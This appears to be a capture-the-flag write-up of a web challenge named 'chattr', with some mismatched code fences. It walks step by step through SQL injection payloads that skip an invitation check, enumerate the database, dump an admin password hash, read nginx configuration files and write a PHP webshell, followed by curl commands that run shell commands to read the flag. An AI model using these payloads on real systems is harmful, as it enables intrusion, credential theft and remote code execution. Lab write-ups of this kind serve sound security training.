We found a registration form... We need an invitation code.. We can try bypassing the invitation code with a 
sql injection:
```
username=koen&password=Abcd1234%21&repeatPassword=Abcd1234%21&invitationCode=' OR '1'='1
Before sending it we need to url encode the invitationcode.
username=koen&password=Abcd1234%21&repeatPassword=Abcd1234%21&invitationCode=%27%20%4f%52%20%27%31%27%3d%27%31
') ORDER BY 4-- - 
We get the following feedback from the server: `/login.php?s=account+created+successfully!`

Once logged in we can search for comments, we can see using this sql injection it uses a select with 4 columns:
```
') ORDER BY 4-- -  
```

Find the available databases:
```
') UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA -- -
```

The databases returned are `chattr` and `information_schema`.
```
') UNION select 1,2,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- 
```
We see three tables returned: `Users`, `InvitationCodes`, `Messages`.
Let's check the columns of the database Users:
```
') UNION select 1,2,COLUMN_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- 
```
We find the following columns: `UserID`, `Username`, `Password`, `InvitationCode`, `AccountCreated`.

Let's dump the `password` for user `admin`:
```
') UNION select 1,2,UserID,Password from Users where UserID = 1 -- -
```
This returns: `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
`

Now we need to find the root of the web application. With nmap we found the webserver is an nginx server.
```
') UNION SELECT 1, 2,LOAD_FILE("/etc/nginx/nginx.conf"), 4-- -
```

We find following configuration file:
```
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
#
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```
The virtual host is configured in another file, typically:
```
') UNION SELECT 1, 2,LOAD_FILE("/etc/nginx/sites-enabled/default"), 4-- -
```
This spits out:
```
    listen 443 ssl;
    server_name chattr.htb;
    ssl_password_file /root/chattr.key.pass;
    ssl_certificate /etc/ssl/certs/chattr.crt;
    ssl_certificate_key /etc/ssl/private/chattr.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    root /var/www/chattr-prod;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /includes/ {
        deny all;
    }
```
We see the root folder of the website is `/var/www/chattr-prod`

Let's upload a webshell now:
```
') UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- -
```
After the webshell is uploaded we can:
```
curl -k https://94.237.123.185:51738/shell.php?0=ls%20-l%20%2F    #this is ls -l url encoded
```
The flag is named: `flag_876a4c.txt`...
We can cat the flag now:
curl -k https://94.237.123.185:51738/shell.php?0=cat%20%2Fflag_876a4c.txt
```
We found the flag: 061b1aeb94dec6bf5d9c27032b3c1d8d